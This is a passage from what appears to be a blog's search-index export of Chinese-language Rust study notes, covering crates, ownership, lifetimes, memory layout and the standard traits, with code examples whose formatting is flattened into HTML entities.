mio / slab / serde / clap / structopt / indicatif / dialoguer / crossbeam / nom 基础组件库 hyper 处理 http1/http2，quinn / quiche 处理 QUIC/http3，tonic 处理 gRPC，以及 tungstenite / tokio-tungstenite 处理 websocket avro-rs 处理 apache avro，capnp 处理 Cap’n Proto，prost 处理 protobuf，flatbuffers 处理 google flatbuffers，thrift 处理 apache thrift actix-web / rocket / axum Web 框架 diesel / sea-orm ORM，sqlx SQL 支持 jinja 语法的 askama，有类似 jinja2 的 tera，处理 markdown 的 comrak 的模板引擎 纯前端 yew 和 seed，全栈 MoonZoon Web 测试 headless_chrome, thirtyfour 和 fantoccini 静态网站生成领域，对标 hugo 的 zola 和对标 gitbook 的 mdbook 云原生 kube-rs WebAssembly wasm-pack, wasm-bindgen, wasmtime 和 rustwasm 嵌入式开发 embedded WG，Awesome embedded rust 机器学习 tensorflow 的绑定，tch-rs libtorch（PyTorch）的绑定，对标 scikit-learn 的 linfa","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}]},{"title":"RUST Part1","slug":"RUST-part1","date":"2024-06-27T14:54:55.000Z","updated":"2024-06-27T14:59:34.346Z","comments":true,"path":"posts/9b4059d6.html","link":"","permalink":"https://racleray.github.io/posts/9b4059d6.html","excerpt":"Rust Notes","text":"RUST 概览 Rust 变量和函数 const , static 变量需要声明类型。const 是右值，保存在可执行文件的数据段。static 可以声明为可变，lazy_static 结合使用。 默认变量不可变 函数可以作为参数或者返回值。函数没返回值时，默认返回 unit ()。 Rust 数据结构 struct 定义结构体，struct () 元组结构体，有匿名域。空结构体不占任何空间。 enum 定义 tagged union tuple () 数据行为通过 trait 定义 派生宏支持，#[derive(Debug)] ，支持 {:?} 进行打印 Copy 参数传递时，按字节拷贝 Clone 支持结构复制 Rust 控制流程 顺序执行，函数跳转上下文执行 循环执行，loop 死循环，while 条件循环，迭代循环 for。for 循环可用于任何实现了 IntoIterator trait 的数据结构，实际上是 loop 访问迭代器，直到返回 None 分支执行，if/else 模式匹配分支执行。match expr {} ，if let pat = expr {} 只关心某一种匹配情况 错误跳转，终止当前函数执行，向上一层返回错误 异步跳转，async 函数执行 await ，程序可能阻塞当前上下文，跳转到另一个异步任务，直到 await 不再阻塞（poll()） Rust 错误处理 借鉴 Haskell 的错误处理，错误封装在 Result&lt;T, E&gt; 类型中。? 用于传播错误。 Rust 项目组织 mod 组织。在 lib.rs 或者 main.rs 中，用 mod 来声明要加载的模块。子文件下下，新建 mod.rs 类似 python 中的 __init__.py ，写入目录下的子模块文件名称 xx.rs 一个项目也被称为 crate，也可以是一个库。 单元测试一般放在被测试代码相同的文件中，使用条件编译 #[cfg(test)] 来确保测试代码旨在测试环境中编译。 集成测试一般放在 tests 目录下，集成测试只测试公开接口，编译时编译成单独的可执行文件。 cargo test 运行测试用例 所有代码放在一个 crate 中，会导致修改后，频繁编译整个 crate。workspace 是管理多个 crate 的工具。修改只影响所在的 crate。 Rust 可以用过程宏、trait、泛型函数、trait object 等组织代码。 Rust 服务器参考：actix-web 、rocket 、warp、 axum 所有权和生命周期 一个值同一时刻只有一个所有者，作用域外释放资源 赋值或者传参 Move 语义转移所有权 Copy trait 保留原所有权，按位拷贝数据，浅拷贝。可变引用、动态大小数据结构、包含动态大小成员的结构没有默认实现 Copy trait Borrow 默认是只读的，不影响所有权 Rust 传参都是传值 一个值可以有多个只读引用，但是，只读引用不可以和可变引用共存，动态内存再分配导致地址失效的问题 一个值只能有一个可变引用 在所有权模型下，堆内存的生命周期，和创建它的栈内存的生命周期保持一致 引用的生命周期不能超过值的生命周期 运行时动态检查，提供所有权的灵活控制 Rc 和 Arc ，创建多个所有者的数据结构，clone() 不会复制内存中数据，只会增加引用计数，Rc 和 Arc 是可变的，需要结合 RefCell 和 Mutex 实现数据的可变修改 Weak 是 Rc 的弱引用版本 RefCell 绕过 Rust 编译器静态检查，允许在运行时对只读数据进行可变借用。Rc 本身是一个只读的引用计数器 Arc 跨线程访问，原子引用计数，RefCell 变为 Mutex(v.lock()) 或者 RwLock (v.read()/v.write()) Box::leak() 创建了不受栈内存控制的堆内存，从而绕过了编译时所有权规则检查 外部可变性，let mut , let &amp;mut，编译时检查 运行时，修改内部数据，RefCell borrow_mut()，出错会引发 panic 生命周期 除了显示地做 Box::leak() / Box::into_raw() / ManualDrop ，一般情况下，堆内存的生命周期会和其栈内存的生命周期绑定在一起 静态生命周期的值，其引用也有静态生命周期 全局变量，静态变量，字符串字面量等，都有静态生命周期，Box::leak 后也具有静态生命周期，函数指针变量也是静态生命周期（因为它在 text 段） 某个作用域中，创建在堆和栈上的值，其生命周期是动态的 动态生命周期的表达，约定使用 'a 'b 这样表述 生命周期描述的是参数与参数之间，参数与返回值之间的关系，并不改变原有的生命周期 所有引用类型的参数都需要生命周期标注 编译器可以依照一些准则，自动添加标注： 所有引用类型的参数都有独立的生命周期 如果只有一个引用类型输入，它的生命周期会赋给所有的输出 如果有多个引用类型的参数，其中一个是 self，那么它的生命周期会赋给所有输出 使用数据结构时，数据结构自身的生命周期，需要小于等于其内部字段的所有引用的生命周期 内存管理 struct 在栈空间中，rust 会自动重排结构体 enum 按照最大类型长度对齐，长度乘以成员数量 Option 会被有值和无值分别占用两块内存位置 Result&lt;T, E&gt; 会占用两块位置 T 和 E rust 会对 Option 这种引用类型数据进行优化，只占用一块空间，因为 ptr 引用为 0 是不可能的（一定错误的），那么就将 0 表示 None String 内部是 Vec，Vec 是 3 个 word 大小的胖指针：pointer，capacity，length Ref : Rust Language Cheat Sheet Copy Move 都只是浅层的按位内存复制，只要不涉及栈上的大数组拷贝或者堆内存的深拷贝，效率还是很高的 动态数据结构，需要注意频繁的动态扩容缩容，导致的数据拷贝，造成的效率下降。同时考虑使用 shrink_to_fit 节省内存使用 Drop trait ，相当于析构函数，递归调用成员的 drop() rust 会自动对 socket，file，lock 进行关闭，这是其他语言中很罕见的 多个变量和多种异常或者错误叠加，忘记释放资源的风险敞口会成倍增加，导致死锁或者资源泄露。 类型系统 对类型进行定义，检查，处理的系统。 按照定义后，类型是否可以隐式转化，分为强类型和弱类型 按照类型检查的时机是编译时检查还是运行时检查，分为静态类型系统和动态类型系统 Rust 是强类型加静态类型系统。只能按照被允许的方法，访问它被授权访问的内存。 Rust 中除了 let / fn / static / const 这些定义性语句外，都是表达式，而一切表达式都有类型，所以可以说在 Rust 中，类型无处不在。 多态的实现： 动态类型系统，通过鸭子类型实现 静态类型系统，通过参数多态，特设多态，子类型多态实现 参数多态：代码操作的类型是，一个满足一些约束条件的参数，而非具体的类型 特设多态：一种行为可以有多个不同实现的多态，比如函数重载 子类型多态：在运行时，子类型可以被当成父类型使用 Rust 支持： 参数多态 -- 通过泛型实现 特设多态 -- 通过 trait 来支持 子类型多态 -- 通过 trait object 来支持 Rust 支持一个作用域内的局部类型推导。但是，在不能推断出类型的上下文中，需要手动指明类型。比如，全局变量 const / static。 Models of Generics and Metaprogramming: Go, Rust, Swift, D and More - Tristan Hume (thume.ca) Trait Rust 中的接口，定义了某个类型使用这个接口的行为。将数据结构的行为单独抽取出来，可以在多个类型中共享，或者作为参数约束，在泛型编程中使用。 带约束的 Trait 12345678910111213141516171819202122232425use std::str::FromStr;use regex::Regex;pub trait Parse &#123; fn parse(s: &amp;str) -&gt; Self;&#125;// 约束 T 必须同时实现了 FromStr 和 Defaultimpl&lt;T&gt; Parse for Twhere T: FromStr + Default,&#123; fn parse(s: &amp;str) -&gt; Self &#123; let re: Regex = Regex::new(r\"^[0-9]+(\\.[0-9]+)?\").unwrap(); // Default::default() 返回的类型根据上下文能推导出来 let d = || Default::default(); if let Some(captures) = re.captures(s) &#123; captures .get(0) .map_or(d(), |s| s.as_str().parse().unwrap_or(d())) &#125; else &#123; d() &#125; &#125;&#125; 带关联类型的 Trait 12345678910111213141516171819202122232425262728293031use std::str::FromStr;use regex::Regex;pub trait Parse &#123; type Error; fn parse(s: &amp;str) -&gt; Result&lt;Self, Self::Error&gt; where Self: Sized;&#125;impl&lt;T&gt; Parse for Twhere T: FromStr + Default,&#123; // 定义关联类型 Error 为 String type Error = String; fn parse(s: &amp;str) -&gt; Result&lt;Self, Self::Error&gt; &#123; let re: Regex = Regex::new(r\"^[0-9]+(\\.[0-9]+)?\").unwrap(); if let Some(captures) = re.captures(s) &#123; captures .get(0) .map_or(Err(\"failed to capture\".to_string()), |s| &#123; s.as_str() .parse() .map_err(|_err| \"failed to parse captured string\".to_string()) &#125;) &#125; else &#123; Err(\"failed to parse string\".to_string()) &#125; &#125;&#125; trait 方法里的参数或者返回值，都可以用关联类型来表述，而在实现有关联类型的 trait 时，只需要额外提供关联类型的具体类型即可。 支持泛型的 Trait 12345pub trait Add&lt;Rhs = Self&gt; &#123; type Output; #[must_use] fn add(self, rhs: Rhs) -&gt; Self::Output;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142// 对 Complex 类型的实现impl Add for Complex &#123; type Output = Self; // 注意 add 第一个参数是 self，会移动所有权 fn add(self, rhs: Self) -&gt; Self::Output &#123; let real = self.real + rhs.real; let imagine = self.imagine + rhs.imagine; Self::new(real, imagine) &#125;&#125;// 为 &amp;Complex 实现 addimpl Add for &amp;Complex &#123; // 返回 Complex type Output = Complex; fn add(self, rhs: Self) -&gt; Self::Output &#123; let real = self.real + rhs.real; let imagine = self.imagine + rhs.imagine; Complex::new(real, imagine) &#125;&#125;// 因为 Add&lt;Rhs = Self&gt; 是个泛型 trait，可以为 Complex 实现 Add&lt;f64&gt;impl Add&lt;f64&gt; for &amp;Complex &#123; type Output = Complex; // rhs 现在是 f64 fn add(self, rhs: f64) -&gt; Self::Output &#123; let real = self.real + rhs; Complex::new(real, self.imagine) &#125;&#125;fn main() &#123; let c1 = Complex::new(1.0, 1f64); let c2 = Complex::new(2 as f64, 3.0); println!(\"&#123;:?&#125;\", &amp;c1 + &amp;c2); println!(\"&#123;:?&#125;\", &amp;c1 + 5.0); println!(\"&#123;:?&#125;\", c1 + c2);&#125; 泛型 trait 可以在需要的时候，对同一种类型的同一个 trait，有多个实现。 Trait 的继承 trait B: A，表示 trait B 在定义时可以使用 trait A 中的关联类型和方法。 很多常见的 trait 都会使用 trait 继承来提供更多的能力，比如 tokio 库中的 AsyncWriteExt、futures 库中的 StreamExt。 1impl&lt;T: ?Sized&gt; StreamExt for T where T: Stream &#123;&#125; 基于子类型多态 Rust 虽然没有父类和子类，但 trait 和实现 trait 的类型之间也是类似的关系。 12345678910111213141516171819202122232425262728struct Cat;struct Dog;trait Animal &#123; fn name(&amp;self) -&gt; &amp;'static str;&#125;impl Animal for Cat &#123; fn name(&amp;self) -&gt; &amp;'static str &#123; \"Cat\" &#125;&#125;impl Animal for Dog &#123; fn name(&amp;self) -&gt; &amp;'static str &#123; \"Dog\" &#125;&#125;// 等价于 fn name&lt;T: Animal&gt;(animal: T) -&gt; &amp;'static str;fn name(animal: impl Animal) -&gt; &amp;'static str &#123; animal.name()&#125;fn main() &#123; let cat = Cat; println!(\"cat: &#123;&#125;\", name(cat));&#125; 这种泛型函数会根据具体使用的类型被单态化，编译成多个实例，是静态分派。 但是有的时候，类型可能很难在编译时决定。使用 Trait Object 可以应对这种情况。 1234567891011121314151617181920// Vec&lt;&gt; 容器里的类型需要是一致的，但此处无法给定一个一致的类型。pub fn format(input: &amp;mut String, formatters: Vec&lt;???&gt;) &#123; for formatter in formatters &#123; formatter.format(input); &#125;&#125;// 动态分派（dynamic dispatching）pub fn format(input: &amp;mut String, formatters: Vec&lt;&amp;dyn Formatter&gt;) &#123; for formatter in formatters &#123; formatter.format(input); &#125;&#125;fn main() &#123; let html: &amp;dyn Formatter = &amp;HtmlFormatter; let rust: &amp;dyn Formatter = &amp;RustFormatter; let formatters = vec![html, rust]; ...&#125; HtmlFormatter 的引用赋值给 Formatter 后，会生成一个 Trait Object。 Trait Object 的底层逻辑就是胖指针。其中，一个指针指向数据本身，另一个则指向虚函数表（vtable）。 vtable 是一张静态的表，Rust 在编译时会为使用了 trait object 的类型的 trait 实现生成一张表，放在可执行文件中（一般在 TEXT 或 RODATA 段）。 Rust 也并不区分原生类型和组合类型，对 Rust 来说，所有类型的地位都是一致的。 使用 trait object 的时候，要注意对象安全（object safety）。只有满足对象安全的 trait 才能使用 trait object。如果 trait 所有的方法，返回值是 Self 或者携带泛型参数，那么这个 trait 就不能产生 trait object。如果一个 trait 只有部分方法返回 Self 或者使用了泛型参数，那么这部分方法在 trait object 中不能调用。 不允许返回 Self，是因为 trait object 在产生时，原来的类型会被抹去，所以 Self 究竟是谁不知道。比如 Clone trait 只有一个方法 clone()，返回 Self，所以它就不能产生 trait object。 不允许携带泛型参数，是因为 Rust 里带泛型的类型在编译时会做单态化，而 trait object 是运行时的产物，两者不能兼容。 vtable 测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546use std::fmt::&#123;Debug, Display&#125;;use std::mem::transmute;fn main() &#123; let s1 = String::from(\"hello world!\"); let s2 = String::from(\"goodbye world!\"); // Display / Debug trait object for s let w1: &amp;dyn Display = &amp;s1; let w2: &amp;dyn Debug = &amp;s1; // Display / Debug trait object for s1 let w3: &amp;dyn Display = &amp;s2; let w4: &amp;dyn Debug = &amp;s2; // 强行把 triat object 转换成两个地址 (usize, usize) // 这是不安全的，所以是 unsafe let (addr1, vtable1): (usize, usize) = unsafe &#123; transmute(w1) &#125;; let (addr2, vtable2): (usize, usize) = unsafe &#123; transmute(w2) &#125;; let (addr3, vtable3): (usize, usize) = unsafe &#123; transmute(w3) &#125;; let (addr4, vtable4): (usize, usize) = unsafe &#123; transmute(w4) &#125;; // s 和 s1 在栈上的地址，以及 main 在 TEXT 段的地址 println!( \"s1: &#123;:p&#125;, s2: &#123;:p&#125;, main(): &#123;:p&#125;\", &amp;s1, &amp;s2, main as *const () ); // trait object(s / Display) 的 ptr 地址和 vtable 地址 println!(\"addr1: 0x&#123;:x&#125;, vtable1: 0x&#123;:x&#125;\", addr1, vtable1); // trait object(s / Debug) 的 ptr 地址和 vtable 地址 println!(\"addr2: 0x&#123;:x&#125;, vtable2: 0x&#123;:x&#125;\", addr2, vtable2); // trait object(s1 / Display) 的 ptr 地址和 vtable 地址 println!(\"addr3: 0x&#123;:x&#125;, vtable3: 0x&#123;:x&#125;\", addr3, vtable3); // trait object(s1 / Display) 的 ptr 地址和 vtable 地址 println!(\"addr4: 0x&#123;:x&#125;, vtable4: 0x&#123;:x&#125;\", addr4, vtable4); // 指向同一个数据的 trait object 其 ptr 地址相同 assert_eq!(addr1, addr2); assert_eq!(addr3, addr4); // 指向同一种类型的同一个 trait 的 vtable 地址相同 // 这里都是 String + Display assert_eq!(vtable1, vtable3); // 这里都是 String + Debug assert_eq!(vtable2, vtable4);&#125; 使用 trait 注意事项 在定义和使用 trait 时，需要遵循孤儿规则（Orphan Rule）。trait 和实现 trait 的数据类型，至少有一个是在当前 crate 中定义的，也就是说，你不能为第三方的类型实现第三方的 trait。 Rust 对含有 async fn 的 trait ，还没有一个很好的被标准库接受的实现(2019) 常见 Trait Clone / Copy trait，约定了数据被深拷贝和浅拷贝的行为； Read / Write trait，约定了对 I/O 读写的行为； Iterator，约定了迭代器的行为； Debug，约定了数据如何被以 debug 的方式显示出来的行为； Default，约定数据类型的缺省值如何产生的行为； From / TryFrom，约定了数据间如何转换的行为. 内存相关：Clone 1234567pub trait Clone &#123; fn clone(&amp;self) -&gt; Self; fn clone_from(&amp;mut self, source: &amp;Self) &#123; *self = source.clone() &#125;&#125; 在 clone 过程中会分配内存，那么用 a.clone_from(&amp;b) 可以避免内存分配，提高效率。 Clone trait 可以通过派生宏直接实现，这样能简化不少代码。如果在你的数据结构里，每一个字段都已经实现了Clone trait，你可以用 #[derive(Clone)]。 Clone 是深度拷贝，栈内存和堆内存一起拷贝。 clone 方法的接口是 &amp;self，这在绝大多数场合下都是适用的。在 clone 一个数据时只需要有已有数据的只读引用。但对 Rc 这样在 clone() 时维护引用计数的数据结构，clone() 过程中会改变自己，所以要用 Cell 这样提供内部可变性的结构来进行改变。 内存相关：Copy Copy trait 没有任何额外的方法，它只是一个标记 trait（marker trait）. 1pub trait Copy: Clone &#123;&#125; 虽然没有任何行为，但它可以用作 trait bound 来进行类型安全检查，所以叫标记 trait。 如果类型实现了 Copy，那么在赋值、函数调用的时候，值会被拷贝，否则所有权会被移动 Move。 可变引用 &amp;mut T 没有实现 Copy。因为，不符合同一个作用域下只能有一个可变引用 的所有权规则。 内存相关：Drop 123pub trait Drop &#123; fn drop(&amp;mut self);&#125; 大部分场景无需为数据结构提供 Drop trait，系统默认会依次对数据结构的每个域做 drop。 除了以下两种情况： 希望在数据结束生命周期的时候做一些事情，比如记日志。 需要对资源回收的场景。比如说锁资源的释放，在 MutexGuard 中实现了 Drop 来释放锁资源： 123456789impl&lt;T: ?Sized&gt; Drop for MutexGuard&lt;'_, T&gt; &#123; #[inline] fn drop(&amp;mut self) &#123; unsafe &#123; self.lock.poison.done(&amp;self.poison); self.lock.inner.raw_unlock(); &#125; &#125;&#125; Copy trait 和 Drop trait 是互斥的，两者不能共存。 Copy是按位做浅拷贝，那么它会默认拷贝的数据没有需要释放的资源；而Drop恰恰是为了释放额外的资源而生的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465use std::&#123;fmt, slice&#125;;// 注意这里，实现了 Copy，这是因为 *mut u8/usize 都支持 Copy#[derive(Clone, Copy)]struct RawBuffer &#123; // 裸指针用 *const / *mut 来表述，这和引用的 &amp; 不同 ptr: *mut u8, len: usize,&#125;impl From&lt;Vec&lt;u8&gt;&gt; for RawBuffer &#123; fn from(vec: Vec&lt;u8&gt;) -&gt; Self &#123; let slice = vec.into_boxed_slice(); Self &#123; len: slice.len(), // into_raw 之后，Box 就不管这块内存的释放了，RawBuffer 需要处理释放 ptr: Box::into_raw(slice) as *mut u8, &#125; &#125;&#125;// 如果 RawBuffer 实现了 Drop trait，就可以在所有者退出时释放堆内存// 然后，Drop trait 会跟 Copy trait 冲突，要么不实现 Copy，要么不实现 Drop// 如果不实现 Drop，那么就会导致内存泄漏，但它不会对正确性有任何破坏// 比如不会出现 use after free 这样的问题。// 你可以试着把下面注释去掉，看看会出什么问题// impl Drop for RawBuffer &#123;// #[inline]// fn drop(&amp;mut self) &#123;// let data = unsafe &#123; Box::from_raw(slice::from_raw_parts_mut(self.ptr, self.len)) &#125;;// drop(data)// &#125;// &#125;impl fmt::Debug for RawBuffer &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; let data = self.as_ref(); write!(f, \"&#123;:p&#125;: &#123;:?&#125;\", self.ptr, data) &#125;&#125;impl AsRef&lt;[u8]&gt; for RawBuffer &#123; fn as_ref(&amp;self) -&gt; &amp;[u8] &#123; unsafe &#123; slice::from_raw_parts(self.ptr, self.len) &#125; &#125;&#125;fn main() &#123; let data = vec![1, 2, 3, 4]; let buf: RawBuffer = data.into(); // 因为 buf 允许 Copy，所以这里 Copy 了一份 use_buffer(buf); // buf 还能用 println!(\"buf: &#123;:?&#125;\", buf);&#125;fn use_buffer(buf: RawBuffer) &#123; println!(\"buf to die: &#123;:?&#125;\", buf); // 这里不用特意 drop，写出来只是为了说明 Copy 出来的 buf 被 Drop 了 drop(buf)&#125; 对于代码安全来说，内存泄漏危害大？还是 use after free 危害大呢？肯定是后者。Rust 的底线是内存安全，所以两害相权取其轻。 无法保证不发生人为的内存泄漏，比如程序在运行时，对哈希表只添加不删除，就会造成内存泄漏。 标记相关：Sized Sized trait 用于标记有具体大小的类型。在使用泛型参数时，Rust 编译器会自动为泛型参数加上 Sized 约束，比如下面的 Data 和处理 Data 的函数 process_data： 1234567struct Data&lt;T&gt; &#123; inner: T,&#125;fn process_data&lt;T&gt;(data: Data&lt;T&gt;) &#123; todo!();&#125; 它等价于： 1234567struct Data&lt;T: Sized&gt; &#123; inner: T,&#125;fn process_data&lt;T: Sized&gt;(data: Data&lt;T&gt;) &#123; todo!();&#125; 在少数情况下，需要 T 是可变类型的，Rust 提供了 ?Sized 来摆脱这个约束。 1234567pub enum Cow&lt;'a, B: ?Sized + 'a&gt; where B: ToOwned,&#123; // 借用的数据 Borrowed(&amp;'a B), // 拥有的数据 Owned(&lt;B as ToOwned&gt;::Owned),&#125; 这样 B 就可以是 [T] 或者 str 类型，大小都是不固定的。要注意 Borrowed(&amp;'a B) 大小是固定的，因为它内部是对 B 的一个引用，而引用的大小是固定的。 标记相关：Send/Sync 说完了 Sized，再来看 Send / Sync，定义是： 12pub unsafe auto trait Send &#123;&#125;pub unsafe auto trait Sync &#123;&#125; 这两个 trait 都是 unsafe auto trait，auto 意味着编译器会在合适的场合，自动为数据结构添加它们的实现，而 unsafe 代表实现的这个 trait 可能会违背 Rust 的内存安全准则，如果开发者手工实现这两个 trait ，要自己为它们的安全性负责。 Send/Sync 是 Rust 并发安全的基础： 如果一个类型 T 实现了 Send trait，意味着 T 可以安全地从一个线程移动到另一个线程，也就是说所有权可以在线程间移动。 如果一个类型 T 实现了 Sync trait，则意味着 &amp;T 可以安全地在多个线程中共享。一个类型 T 满足 Sync trait，当且仅当 &amp;T 满足 Send trait。 如果一个类型T: Send，那么 T 在某个线程中的独占访问是线程安全的；如果一个类型 T: Sync，那么 T 在线程间的只读共享是安全的。 定义的数据结构，如果其内部的所有域都实现了 Send / Sync，那么这个数据结构会被自动添加 Send / Sync 。基本上原生数据结构都支持 Send / Sync，也就是说，绝大多数自定义的数据结构都是满足 Send / Sync 的。标准库中，不支持 Send / Sync 的数据结构主要有： 裸指针 const T / mut T。它们是不安全的，所以既不是 Send 也不是 Sync。 UnsafeCell 不支持 Sync。也就是说，任何使用了 Cell 或者 RefCell 的数据结构不支持 Sync。 引用计数 Rc 不支持 Send 也不支持 Sync。所以 Rc 无法跨线程。 如果尝试跨线程使用 Rc / RefCell，会发生什么？ 12345pub fn spawn&lt;F, T&gt;(f: F) -&gt; JoinHandle&lt;T&gt; where F: FnOnce() -&gt; T, F: Send + 'static, T: Send + 'static, 'static 意思是闭包捕获的自由变量必须是一个拥有所有权的类型，或者是一个拥有静态生命周期的引用； Send 意思是，这些被捕获自由变量的所有权可以从一个线程移动到另一个线程。 如果在线程间传递 Rc，是无法编译通过的，因为 Rc 的实现不支持 Send 和 Sync。 Arc 内部的数据是共享的，需要支持 Sync 的数据结构，但是RefCell 不是 Sync。 标记相关：Unpin 类型转换：From 1234567891011// 第一种方法，为每一种转换提供一个方法// 把字符串 s 转换成 Pathlet v = s.to_path();// 把字符串 s 转换成 u64let v = s.to_u64();// 第二种方法，为 s 和要转换的类型之间实现一个 Into&lt;T&gt; trait// v 的类型根据上下文得出let v = s.into();// 或者也可以显式地标注 v 的类型let v: u64 = s.into(); 第一种方式，在类型 T 的实现里，要为每一种可能的转换提供一个方法；第二种，为类型 T 和类型 U 之间的转换实现一个数据转换 trait，这样可以用同一个方法来实现不同的转换。 显然，第二种方法要更好，因为它符合软件开发的开闭原则（Open-Close Principle），“软件中的对象（类、模块、函数等等）对扩展是开放的，但是对修改是封闭的”。 Rust 提供了两套不同的 trait： 值类型到值类型的转换：From / Into / TryFrom / TryInto 引用类型到引用类型的转换：AsRef / AsMut 先看 From 和 Into。这两个 trait 的定义如下： 1234567pub trait From&lt;T&gt; &#123; fn from(T) -&gt; Self;&#125;pub trait Into&lt;T&gt; &#123; fn into(self) -&gt; T;&#125; 在实现 From 的时候会自动实现 Into。这是因为： 123456// 实现 From 会自动实现 Intoimpl&lt;T, U&gt; Into&lt;U&gt; for T where U: From&lt;T&gt; &#123; fn into(self) -&gt; U &#123; U::from(self) &#125;&#125; 所以大部分情况下，只用实现 From，然后这两种方式都能做数据转换，比如： 12let s = String::from(\"Hello world!\");let s: String = \"Hello world!\".into(); 这两种方式是等价的，怎么选呢？From 可以根据上下文做类型推导，使用场景更多；而且因为实现了 From 会自动实现 Into，反之不会。所以需要的时候，不要去实现 Into，只要实现 From 就好了。 此外，From 和 Into 还是自反的：把类型 T 的值转换成类型 T，会直接返回。这是因为标准库有如下的实现： 123456// From（以及 Into）是自反的impl&lt;T&gt; From&lt;T&gt; for T &#123; fn from(t: T) -&gt; T &#123; t &#125;&#125; 有了 From 和 Into，很多函数的接口就可以变得灵活，比如函数如果接受一个 IpAddr 为参数，可以使用 Into 让更多的类型可以被这个函数使用，看下面的代码： 12345678910111213141516171819use std::net::&#123;IpAddr, Ipv4Addr, Ipv6Addr&#125;;fn print(v: impl Into&lt;IpAddr&gt;) &#123; println!(\"&#123;:?&#125;\", v.into());&#125;fn main() &#123; let v4: Ipv4Addr = \"2.2.2.2\".parse().unwrap(); let v6: Ipv6Addr = \"::1\".parse().unwrap(); // IPAddr 实现了 From&lt;[u8; 4]，转换 IPv4 地址 print([1, 1, 1, 1]); // IPAddr 实现了 From&lt;[u16; 8]，转换 IPv6 地址 print([0xfe80, 0, 0, 0, 0xaede, 0x48ff, 0xfe00, 0x1122]); // IPAddr 实现了 From&lt;Ipv4Addr&gt; print(v4); // IPAddr 实现了 From&lt;Ipv6Addr&gt; print(v6);&#125; 所以，合理地使用 From / Into，可以让代码变得简洁，符合 Rust 可读性强的风格，更符合开闭原则。 如果你的数据类型在转换过程中有可能出现错误，可以使用 TryFrom 和 TryInto，它们的用法和 From / Into 一样，只是 trait 内多了一个关联类型 Error，且返回的结果是 Result&lt;T, Self::Error&gt;。 类型转换：AsRef / AsMut 1234567pub trait AsRef&lt;T&gt; where T: ?Sized &#123; fn as_ref(&amp;self) -&gt; &amp;T;&#125;pub trait AsMut&lt;T&gt; where T: ?Sized &#123; fn as_mut(&amp;mut self) -&gt; &amp;mut T;&#125; 在 trait 的定义上，都允许 T 使用大小可变的类型，如 str、[u8] 等。AsMut 除了使用可变引用生成可变引用外，其它都和 AsRef 一样。 看标准库中打开文件的接口 std::fs::File::open： 1pub fn open&lt;P: AsRef&lt;Path&gt;&gt;(path: P) -&gt; Result&lt;File&gt; 它的参数 path 是符合 AsRef 的类型，所以，你可以为这个参数传入 String、&amp;str、PathBuf、Path 等类型。而且，当你使用 path.as_ref() 时，会得到一个 &amp;Path。 1234567891011121314151617181920212223242526272829303132#[allow(dead_code)]enum Language &#123; Rust, TypeScript, Elixir, Haskell,&#125;impl AsRef&lt;str&gt; for Language &#123; fn as_ref(&amp;self) -&gt; &amp;str &#123; match self &#123; Language::Rust =&gt; \"Rust\", Language::TypeScript =&gt; \"TypeScript\", Language::Elixir =&gt; \"Elixir\", Language::Haskell =&gt; \"Haskell\", &#125; &#125;&#125;fn print_ref(v: impl AsRef&lt;str&gt;) &#123; println!(\"&#123;&#125;\", v.as_ref());&#125;fn main() &#123; let lang = Language::Rust; // &amp;str 实现了 AsRef&lt;str&gt; print_ref(\"Hello world!\"); // String 实现了 AsRef&lt;str&gt; print_ref(\"Hello world!\".to_string()); // 自己定义的 enum 也实现了 AsRef&lt;str&gt; print_ref(lang);&#125; 如果你的代码出现 v.as_ref().clone() 这样的语句，也就是说你要对 v 进行引用转换，然后又得到了拥有所有权的值，那么你应该实现 From，然后做 v.into()。 操作符相关：Deref/DerefMut 123456789pub trait Deref &#123; // 解引用出来的结果类型 type Target: ?Sized; fn deref(&amp;self) -&gt; &amp;Self::Target;&#125;pub trait DerefMut: Deref &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut Self::Target;&#125; 可以看到，DerefMut “继承”了 Deref，只是它额外提供了一个 deref_mut 方法，用来获取可变的解引用。 Deref 和 DerefMut 是自动调用的，b 会被展开为 (b.deref()) 在 Rust 里，绝大多数智能指针都实现了 Deref，也可以为自己的数据结构实现 Deref。 对于普通的引用，解引用很直观，因为它只有一个指向值的地址，从这个地址可以获取到所需要的值，比如下面的例子： 1234let mut x = 42;let y = &amp;mut x;// 解引用，内部调用 DerefMut（其实现就是 *self）*y += 1; 但对智能指针来说，拿什么域来解引用就不那么直观了，来看之前学过的 Rc 是怎么实现 Deref 的： 1234567impl&lt;T: ?Sized&gt; Deref for Rc&lt;T&gt; &#123; type Target = T; fn deref(&amp;self) -&gt; &amp;T &#123; &amp;self.inner().value &#125;&#125; 可以看到，它最终指向了堆上的 RcBox 内部的 value 的地址，然后如果对其解引用的话，得到了 value 对应的值。 1234567891011121314151617181920212223242526272829303132use std::ops::&#123;Deref, DerefMut&#125;;#[derive(Debug)]struct Buffer&lt;T&gt;(Vec&lt;T&gt;);impl&lt;T&gt; Buffer&lt;T&gt; &#123; pub fn new(v: impl Into&lt;Vec&lt;T&gt;&gt;) -&gt; Self &#123; Self(v.into()) &#125;&#125;impl&lt;T&gt; Deref for Buffer&lt;T&gt; &#123; type Target = [T]; fn deref(&amp;self) -&gt; &amp;Self::Target &#123; &amp;self.0 &#125;&#125;impl&lt;T&gt; DerefMut for Buffer&lt;T&gt; &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut Self::Target &#123; &amp;mut self.0 &#125;&#125;fn main() &#123; let mut buf = Buffer::new([1, 3, 2, 4]); // 因为实现了 Deref 和 DerefMut，这里 buf 可以直接访问 Vec&lt;T&gt; 的方法 // 下面这句相当于：(&amp;mut buf).deref_mut().sort()，也就是 (&amp;mut buf.0).sort() buf.sort(); println!(\"buf: &#123;:?&#125;\", buf);&#125; 实现 Deref 和 DerefMut，这样在解引用的时候，直接访问到 buf.0，省去了代码的啰嗦和数据结构内部字段的隐藏。 其它: Debug 先看 Debug / Display，它们的定义如下： 1234567pub trait Debug &#123; fn fmt(&amp;self, f: &amp;mut Formatter&lt;'_&gt;) -&gt; Result&lt;(), 